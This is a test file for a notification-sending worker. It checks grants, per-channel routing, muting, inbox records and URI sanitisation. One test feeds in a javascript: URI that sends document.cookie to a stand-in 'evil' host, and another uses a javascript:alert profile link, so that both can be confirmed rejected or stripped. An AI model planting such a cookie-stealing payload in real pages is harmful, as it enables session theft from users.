import type { Did } from '@atcute/lexicons';
import { createExecutionContext, env, waitOnExecutionContext } from 'cloudflare:test';
import { beforeAll, expect, it } from 'vitest';

import * as q from '../src/db/queries';
import worker from '../src/index';

import {
  addDMTarget,
  addPush,
  addTelegram,
  addVerifiedEmail,
  addWebhookTarget,
  installFetchMock,
  makeIdentity,
  makeJwt,
  mockPlc,
  mockTelegramOk,
  xrpcPost,
} from './helpers';

beforeAll(() => {
  installFetchMock();
  mockTelegramOk();
});

const SEND = 'pub.atmo.notify.send';
const RECIPIENT: Did = 'did:plc:sendrecipient';

async function call(req: Request): Promise<Response> {
  const ctx = createExecutionContext();
  const res = await worker.fetch(req, env, ctx);
  await waitOnExecutionContext(ctx);
  return res;
}

function send(jwt: string): Request {
  return xrpcPost(SEND, jwt, { recipient: RECIPIENT, title: 'Hello', body: 'World' });
}

it('returns 403 when no grant exists', async () => {
  const sender = await makeIdentity('did:plc:sendnogrant');
  mockPlc(sender);
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(send(jwt));

  expect(res.status).toBe(403);
});

it('accepts but delivers to nobody when there is a grant but no channel', async () => {
  const sender = await makeIdentity('did:plc:sendnochannel');
  mockPlc(sender);
  await q.upsertGrant(env.DB, {
    recipientDid: RECIPIENT,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(send(jwt));

  expect(res.status).toBe(200);
  expect(await res.json()).toMatchObject({ delivered: 0 });
});

it('enqueues and reports delivered=1 with a linked channel', async () => {
  const sender = await makeIdentity('did:plc:sendchannel');
  mockPlc(sender);
  await q.upsertGrant(env.DB, {
    recipientDid: RECIPIENT,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  await addTelegram(env.DB, RECIPIENT, '12345');
  // Default route is 'push'; opt this recipient into Telegram so the channel fires.
  await q.ensureUser(env.DB, RECIPIENT, Date.now());
  await q.setDefaultRoute(env.DB, RECIPIENT, 'push+telegram');
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(send(jwt));

  expect(res.status).toBe(200);
  expect(await res.json()).toMatchObject({ delivered: 1 });

  const log = await env.DB.prepare('SELECT delivered_count FROM delivery_log WHERE recipient_did = ?')
    .bind(RECIPIENT)
    .first<{ delivered_count: number }>();
  expect(log?.delivered_count).toBe(1);
});

it('records the notification in the inbox', async () => {
  const sender = await makeIdentity('did:plc:sendinbox');
  mockPlc(sender);
  await q.upsertGrant(env.DB, {
    recipientDid: RECIPIENT,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  const jwt = await makeJwt(sender, { lxm: SEND });

  await call(send(jwt));

  const rows = await q.listNotificationsForRecipient(env.DB, RECIPIENT, 50);
  expect(rows.some((r) => r.sender_did === sender.did && r.title === 'Hello')).toBe(true);
});

it('per-category routing gates which channels fire', async () => {
  const sender = await makeIdentity('did:plc:sendroute');
  mockPlc(sender);
  const recip: Did = 'did:plc:routerecipient';
  await q.ensureUser(env.DB, recip, Date.now());
  await q.upsertGrant(env.DB, {
    recipientDid: recip,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  await addTelegram(env.DB, recip, '99999');
  // Default 'push' would skip Telegram, but this category is routed to Telegram.
  await q.setDefaultRoute(env.DB, recip, 'push');
  await q.upsertRouting(env.DB, recip, sender.did, 'mention', 'telegram');
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(
    xrpcPost(SEND, jwt, { recipient: recip, title: 'Hi', body: 'B', category: 'mention' })
  );

  expect(res.status).toBe(200);
  expect(await res.json()).toMatchObject({ delivered: 1 });
});

it('app-wide routing gates delivery when the notification has no category', async () => {
  const sender = await makeIdentity('did:plc:sendapproute');
  mockPlc(sender);
  const recip: Did = 'did:plc:approuterecipient';
  await q.ensureUser(env.DB, recip, Date.now());
  await q.upsertGrant(env.DB, {
    recipientDid: recip,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  await addTelegram(env.DB, recip, '88888');
  // Account default 'push' would skip Telegram, but the app-wide route is Telegram.
  await q.setDefaultRoute(env.DB, recip, 'push');
  await q.upsertAppRoute(env.DB, recip, sender.did, 'telegram');
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(xrpcPost(SEND, jwt, { recipient: recip, title: 'Hi', body: 'B' }));

  expect(res.status).toBe(200);
  expect(await res.json()).toMatchObject({ delivered: 1 });
});

it('accepts silently with delivered=0 when the grant is muted', async () => {
  const sender = await makeIdentity('did:plc:sendmuted');
  mockPlc(sender);
  await q.upsertGrant(env.DB, {
    recipientDid: RECIPIENT,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  await q.setGrantMuted(env.DB, RECIPIENT, sender.did, true);
  await addTelegram(env.DB, RECIPIENT, '54321');
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(send(jwt));

  expect(res.status).toBe(200);
  expect(await res.json()).toMatchObject({ delivered: 0 });
});

it('delivers to a verified email when the route includes email', async () => {
  const sender = await makeIdentity('did:plc:sendemail');
  mockPlc(sender);
  const recip: Did = 'did:plc:emailrecipient';
  await q.ensureUser(env.DB, recip, Date.now());
  await q.upsertGrant(env.DB, {
    recipientDid: recip,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  // A verified email + a route that includes it.
  await addVerifiedEmail(env.DB, recip, 'me@example.com');
  await q.setDefaultRoute(env.DB, recip, 'push+email');
  const jwt = await makeJwt(sender, { lxm: SEND });

  // Push has no subscriptions, so only the email target counts.
  const res = await call(xrpcPost(SEND, jwt, { recipient: recip, title: 'Hi', body: 'B' }));

  expect(res.status).toBe(200);
  expect(await res.json()).toMatchObject({ delivered: 1 });
});

it('delivers to a Bluesky DM when the route includes dm', async () => {
  const sender = await makeIdentity('did:plc:senddm');
  mockPlc(sender);
  const recip: Did = 'did:plc:dmrecipient';
  await q.ensureUser(env.DB, recip, Date.now());
  await q.upsertGrant(env.DB, {
    recipientDid: recip,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  await addDMTarget(env.DB, recip);
  await q.setDefaultRoute(env.DB, recip, 'dm');
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(xrpcPost(SEND, jwt, { recipient: recip, title: 'Hi', body: 'B' }));

  expect(res.status).toBe(200);
  expect(await res.json()).toMatchObject({ delivered: 1 });
});

it('delivers to a webhook when the route includes webhook', async () => {
  const sender = await makeIdentity('did:plc:sendwebhook');
  mockPlc(sender);
  const recip: Did = 'did:plc:webhookrecipient';
  await q.ensureUser(env.DB, recip, Date.now());
  await q.upsertGrant(env.DB, {
    recipientDid: recip,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  await addWebhookTarget(env.DB, recip, 'https://hook.example/r');
  await q.setDefaultRoute(env.DB, recip, 'webhook');
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(xrpcPost(SEND, jwt, { recipient: recip, title: 'Hi', body: 'B' }));

  expect(res.status).toBe(200);
  expect(await res.json()).toMatchObject({ delivered: 1 });
});

it("route 'off' drops the notification entirely — not even recorded in the inbox", async () => {
  const sender = await makeIdentity('did:plc:sendoff');
  mockPlc(sender);
  const recip: Did = 'did:plc:offrecipient';
  await q.ensureUser(env.DB, recip, Date.now());
  await q.upsertGrant(env.DB, {
    recipientDid: recip,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  await addPush(env.DB, recip, 'https://push.example/off-device');
  await q.setDefaultRoute(env.DB, recip, 'off');
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(xrpcPost(SEND, jwt, { recipient: recip, title: 'X', body: 'Y' }));

  expect(res.status).toBe(200);
  expect(await res.json()).toMatchObject({ delivered: 0 });
  expect(await q.listNotificationsForRecipient(env.DB, recip, 50)).toHaveLength(0);
});

it("route 'inbox' records the notification but fires no alerts", async () => {
  const sender = await makeIdentity('did:plc:sendinboxonly');
  mockPlc(sender);
  const recip: Did = 'did:plc:inboxonlyrecipient';
  await q.ensureUser(env.DB, recip, Date.now());
  await q.upsertGrant(env.DB, {
    recipientDid: recip,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  // A live push target, but the route is inbox-only → no alerts.
  await addPush(env.DB, recip, 'https://push.example/inbox-device');
  await q.setDefaultRoute(env.DB, recip, 'inbox');
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(xrpcPost(SEND, jwt, { recipient: recip, title: 'Hi', body: 'B' }));

  expect(res.status).toBe(200);
  expect(await res.json()).toMatchObject({ delivered: 0 });
  expect(await q.listNotificationsForRecipient(env.DB, recip, 50)).toHaveLength(1);
});

it('a mixed route delivers to all of one channel AND a specific instance of another', async () => {
  const sender = await makeIdentity('did:plc:sendmixed');
  mockPlc(sender);
  const recip: Did = 'did:plc:mixedrecipient';
  await q.ensureUser(env.DB, recip, Date.now());
  await q.upsertGrant(env.DB, {
    recipientDid: recip,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  // Two push devices (route to ALL) + two telegram chats (route to ONE).
  await addPush(env.DB, recip, 'https://push.example/d1');
  await addPush(env.DB, recip, 'https://push.example/d2');
  const chat1 = await addTelegram(env.DB, recip, '111');
  await addTelegram(env.DB, recip, '222');
  await q.setDefaultRoute(env.DB, recip, `push+telegram:${chat1}`);
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(xrpcPost(SEND, jwt, { recipient: recip, title: 'Hi', body: 'B' }));

  expect(res.status).toBe(200);
  // both push devices + only chat1 = 3.
  expect(await res.json()).toMatchObject({ delivered: 3 });
});

it('rejects a javascript: uri with 400 and records nothing in the inbox', async () => {
  const sender = await makeIdentity('did:plc:sendjsuri');
  mockPlc(sender);
  const recip: Did = 'did:plc:jsurirecipient';
  await q.ensureUser(env.DB, recip, Date.now());
  await q.upsertGrant(env.DB, {
    recipientDid: recip,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(
    xrpcPost(SEND, jwt, {
      recipient: recip,
      title: 'Hi',
      body: 'B',
      uri: 'javascript:fetch("https://evil/"+document.cookie)'
    })
  );

  expect(res.status).toBe(400);
  // A rejected request has no side effects (no inbox row).
  expect(await q.listNotificationsForRecipient(env.DB, recip, 50)).toHaveLength(0);
});

it('rejects a non-http(s) scheme (tg:) with 400', async () => {
  const sender = await makeIdentity('did:plc:sendtguri');
  mockPlc(sender);
  await q.upsertGrant(env.DB, {
    recipientDid: RECIPIENT,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(
    xrpcPost(SEND, jwt, {
      recipient: RECIPIENT,
      title: 'Hi',
      body: 'B',
      uri: 'tg://resolve?domain=evil'
    })
  );

  expect(res.status).toBe(400);
});

it('rejects an over-long uri with 400', async () => {
  const sender = await makeIdentity('did:plc:sendlonguri');
  mockPlc(sender);
  await q.upsertGrant(env.DB, {
    recipientDid: RECIPIENT,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  const jwt = await makeJwt(sender, { lxm: SEND });
  const longUri = 'https://example.com/' + 'a'.repeat(2050);

  const res = await call(
    xrpcPost(SEND, jwt, { recipient: RECIPIENT, title: 'Hi', body: 'B', uri: longUri })
  );

  expect(res.status).toBe(400);
});

it('accepts a valid https uri and stores it unchanged in the inbox', async () => {
  const sender = await makeIdentity('did:plc:sendvaliduri');
  mockPlc(sender);
  const recip: Did = 'did:plc:validurirecipient';
  await q.ensureUser(env.DB, recip, Date.now());
  await q.upsertGrant(env.DB, {
    recipientDid: recip,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  await q.setDefaultRoute(env.DB, recip, 'inbox');
  const jwt = await makeJwt(sender, { lxm: SEND });
  const uri = 'https://example.com/post/123?ref=abc';

  const res = await call(xrpcPost(SEND, jwt, { recipient: recip, title: 'Hi', body: 'B', uri }));

  expect(res.status).toBe(200);
  const rows = await q.listNotificationsForRecipient(env.DB, recip, 50);
  expect(rows[0]?.uri).toBe(uri);
});

it('sanitizes actor avatar/profile URLs (drops non-http(s))', async () => {
  const sender = await makeIdentity('did:plc:sendactorurls');
  mockPlc(sender);
  const recip: Did = 'did:plc:actorurlsrecipient';
  await q.ensureUser(env.DB, recip, Date.now());
  await q.upsertGrant(env.DB, {
    recipientDid: recip,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  await q.setDefaultRoute(env.DB, recip, 'inbox');
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(
    xrpcPost(SEND, jwt, {
      recipient: recip,
      title: 'Hi',
      body: 'B',
      actors: [
        {
          did: 'did:plc:gooda',
          handle: 'good.test',
          avatarImage: 'https://cdn.test/a.png',
          url: 'https://bsky.app/profile/good.test'
        },
        // A malicious sender: a `javascript:` profile link + a `data:` avatar.
        { did: 'did:plc:bada', url: 'javascript:alert(1)', avatarImage: 'data:image/png;base64,AA' }
      ]
    })
  );

  expect(res.status).toBe(200);
  const rows = await q.listNotificationsForRecipient(env.DB, recip, 50);
  const actors = JSON.parse(rows[0]?.actors ?? '[]') as unknown;
  expect(actors).toEqual([
    {
      did: 'did:plc:gooda',
      handle: 'good.test',
      avatarImage: 'https://cdn.test/a.png',
      url: 'https://bsky.app/profile/good.test'
    },
    // The unsafe url + avatarImage were dropped; the actor itself is kept.
    { did: 'did:plc:bada' }
  ]);
});

it('an instance-scoped route delivers to just that one device', async () => {
  const sender = await makeIdentity('did:plc:sendoneinstance');
  mockPlc(sender);
  const recip: Did = 'did:plc:oneinstancerecipient';
  await q.ensureUser(env.DB, recip, Date.now());
  await q.upsertGrant(env.DB, {
    recipientDid: recip,
    senderDid: sender.did,
    grantedAt: Date.now(),
    title: null,
    description: null,
    iconUrl: null
  });
  // Two push devices; route to only the first by its instance id.
  const laptop = await addPush(env.DB, recip, 'https://push.example/laptop', 'Laptop');
  await addPush(env.DB, recip, 'https://push.example/phone', 'Phone');
  await q.setDefaultRoute(env.DB, recip, `push:${laptop}`);
  const jwt = await makeJwt(sender, { lxm: SEND });

  const res = await call(xrpcPost(SEND, jwt, { recipient: recip, title: 'Hi', body: 'B' }));

  expect(res.status).toBe(200);
  expect(await res.json()).toMatchObject({ delivered: 1 });
});
